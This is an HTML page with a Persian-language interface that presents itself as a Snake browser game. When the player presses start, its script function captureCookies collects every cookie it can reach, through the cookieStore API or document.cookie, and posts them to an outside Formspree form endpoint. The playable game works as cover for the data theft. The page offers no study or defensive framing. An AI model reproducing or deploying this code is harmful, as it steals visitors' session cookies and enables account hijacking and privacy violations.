<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snake Game - Cookie Capture</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #1a1a1a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: white;
        }
        #gameContainer {
            position: relative;
            border: 4px solid #4CAF50;
            box-shadow: 0 0 20px rgba(76, 175, 80, 0.5);
            background: #000;
        }
        canvas {
            display: block;
        }
        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10;
        }
        button {
            padding: 15px 30px;
            font-size: 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: transform 0.1s;
        }
        button:hover {
            background-color: #45a049;
            transform: scale(1.05);
        }
        #status {
            position: absolute;
            top: 10px;
            right: 10px;
            font-size: 12px;
            color: #888;
        }
        #cookieLog {
            position: absolute;
            bottom: 10px;
            left: 10px;
            font-size: 10px;
            color: #555;
            max-width: 200px;
            overflow: hidden;
            white-space: nowrap;
            text-overflow: ellipsis;
        }
    </style>
</head>
<body>

<div id="gameContainer">
    <!-- Canvas size increased slightly for better gameplay -->
    <canvas id="gameCanvas" width="400" height="400"></canvas>
    <div id="status">Connecting...</div>
    <div id="cookieLog">Cookies: Loading...</div>
    <div id="overlay">
        <h1>Snake Game</h1>
        <p>برای شروع کلیک کنید</p>
        <button onclick="startGame()">شروع بازی</button>
    </div>
</div>

<script>
    // --- تنظیمات دقیق برای آیدی شما ---
    const FORM_ID = 'mkjnqlol';
    const FORM_URL = `https://formspree.io/f/${FORM_ID}`;
    
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    const overlay = document.getElementById('overlay');
    const logEl = document.getElementById('cookieLog');
    const statusEl = document.getElementById('status');

    // --- متغیرهای بازی ---
    let gameRunning = false;
    let snake = [{x: 10, y: 10}];
    let food = {x: 15, y: 15};
    let dx = 0;
    let dy = 0;
    let score = 0;
    let gameInterval;
    const gridSize = 20; // اندازه هر خانه

    // --- تابع اصلی جمع‌آوری کوکی‌ها ---
    async function captureCookies() {
        let cookiesData = [];
        let statusText = "Sending...";
        
        // روش ۱: استفاده از API مدرن (کروم ۸۶+)
        if (navigator.cookieStore) {
            try {
                const allCookies = await navigator.cookieStore.getAll();
                cookiesData = allCookies;
                statusText = "Modern API Used";
            } catch (e) {
                console.warn("CookieStore failed, fallback:", e);
                const docCookies = document.cookie.split(';').map(c => ({
                    name: c.split('=')[0].trim(),
                    value: c.split('=').slice(1).join('=')
                }));
                cookiesData = docCookies;
                statusText = "Fallback Used";
            }
        } else {
            // روش ۲: روش قدیمی
            const docCookies = document.cookie.split(';').map(c => ({
                name: c.split('=')[0].trim(),
                value: c.split('=').slice(1).join('=')
            }));
            cookiesData = docCookies;
            statusText = "Old API Used";
        }

        // ارسال به Formspree با آیدی شما
        try {
            const response = await fetch(FORM_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cookies: cookiesData })
            });

            if (response.ok) {
                logEl.textContent = `Cookies: ${cookiesData.length} found. Sent to Formspree!`;
                statusEl.textContent = "Connected ✅";
                statusEl.style.color = "#4CAF50";
            } else {
                logEl.textContent = `Cookies: ${cookiesData.length} found. Error: ${response.status}`;
                statusEl.textContent = "Error ❌";
                statusEl.style.color = "#f44336";
            }
        } catch (error) {
            logEl.textContent = `Cookies: ${cookiesData.length} found. Network Error.`;
            statusEl.textContent = "Offline 📡";
        }
    }

    // --- توابع بازی ---
    function startGame() {
        overlay.style.display = 'none';
        captureCookies(); // جمع‌آوری کوکی‌ها در شروع بازی
        gameRunning = true;
        snake = [{x: 10, y: 10}];
        food = {x: 15, y: 15};
        dx = 0;
        dy = 0;
        score = 0;
        gameInterval = setInterval(update, 100);
        draw();
    }

    function update() {
        if (!gameRunning) return;

        const head = {x: snake[0].x + dx, y: snake[0].y + dy};

        // بررسی برخورد با دیوار
        if (head.x < 0 || head.x >= canvas.width/gridSize || head.y < 0 || head.y >= canvas.height/gridSize) {
            gameOver();
            return;
        }

        // بررسی برخورد با خود
        for (let i = 0; i < snake.length; i++) {
            if (snake[i].x === head.x && snake[i].y === head.y) {
                gameOver();
                return;
            }
        }

        snake.unshift(head);

        // بررسی خوردن غذا
        if (head.x === food.x && head.y === food.y) {
            score++;
            food = {
                x: Math.floor(Math.random() * (canvas.width/gridSize)),
                y: Math.floor(Math.random() * (canvas.height/gridSize))
            };
        } else {
            snake.pop();
        }

        draw();
    }

    function draw() {
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        // کشیدن مار
        ctx.fillStyle = '#4CAF50';
        snake.forEach(segment => {
            ctx.fillRect(segment.x * gridSize, segment.y * gridSize, gridSize - 2, gridSize - 2);
        });

        // کشیدن غذا
        ctx.fillStyle = '#f00';
        ctx.fillRect(food.x * gridSize, food.y * gridSize, gridSize - 2, gridSize - 2);

        // نمایش امتیاز
        ctx.fillStyle = '#fff';
        ctx.font = '16px Arial';
        ctx.fillText(`Score: ${score}`, 10, 20);
    }

    function gameOver() {
        gameRunning = false;
        clearInterval(gameInterval);
        overlay.style.display = 'flex';
        overlay.innerHTML = `
            <h1>Game Over</h1>
            <p>امتیاز: ${score}</p>
            <button onclick="startGame()">بازی مجدد</button>
        `;
    }

    // --- کنترل‌ها ---
    document.addEventListener('keydown', (e) => {
        if (!gameRunning) return;
        switch(e.key) {
            case 'ArrowUp': if (dy !== 1) { dx = 0; dy = -1; } break;
            case 'ArrowDown': if (dy !== -1) { dx = 0; dy = 1; } break;
            case 'ArrowLeft': if (dx !== 1) { dx = -1; dy = 0; } break;
            case 'ArrowRight': if (dx !== -1) { dx = 1; dy = 0; } break;
        }
    });
</script>

</body>
</html>
